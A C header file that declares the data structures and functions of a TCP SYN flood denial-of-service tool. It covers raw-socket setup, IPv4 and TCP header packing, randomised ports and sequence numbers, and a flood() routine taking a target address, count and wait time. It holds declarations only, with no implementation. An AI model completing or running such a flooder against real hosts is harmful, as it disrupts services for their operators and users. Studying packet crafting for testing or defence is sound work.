#ifndef DOS_SYN
#define DOS_SYN
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>

#define PAYLOAD_SIZE (20 + 20)
#define MAX_RANDOM_RANGE 0xffff
#define MAX_RANDOM_IDENTIFICATION 0xffff
#define MAX_RANDOM_SEQUENCE 0xffffffff

typedef struct {
    unsigned char version;
    unsigned char ihl;
    unsigned char tos;
    unsigned short total_length;
    unsigned short identification;
    unsigned char flags;
    unsigned char fragment_offset;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short checksum;
    unsigned char src_addr[4];
    unsigned char dst_addr[4];
} IPv4_Header;

typedef struct {
    unsigned short src_port;
    unsigned short dst_port;
    unsigned long sequence;
    unsigned long acknowledgement;
    unsigned char data_offset;
    unsigned char cwr : 1;
    unsigned char ece : 1;
    unsigned char urg : 1;
    unsigned char ack : 1;
    unsigned char psh : 1;
    unsigned char rst : 1;
    unsigned char syn : 1;
    unsigned char fin : 1;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_pointer;
} TCP_Header;

typedef struct {
    unsigned char src_addr[4];
    unsigned char dst_addr[4];
    unsigned char zeros;
    unsigned char protocol;
    unsigned short tcp_length;
} TCP_Pseudo_Header;

typedef struct {
    IPv4_Header *ip;
    TCP_Header *tcp;
    TCP_Pseudo_Header *pseudo;
} Payload;

typedef struct {
    void *buffer;
    unsigned short index;
    unsigned char ip_length;
    unsigned char tcp_length;
    unsigned char tcp_pseudo_length;
} Buffer;

typedef struct {
    unsigned char src_addr[4];
    unsigned char dst_addr[4];
    unsigned int port;
    unsigned long count;
    unsigned char rand_port : 1;
    float wait_time;
} DoS_SYN_args;

unsigned int init_socket(void);
void pack_ipv4_header(Buffer *buf, Payload *payload);
void pack_tcp_header(Buffer *buf, Payload *payload);
void pack_tcp_pseudo_header(unsigned char *buf, Payload *payload);
unsigned int push_payload(int sockfd, Buffer *buf, Payload *payload, struct sockaddr_in *addr);
void free_buffer(Buffer *buf);
unsigned int flood(DoS_SYN_args *args);

#endif
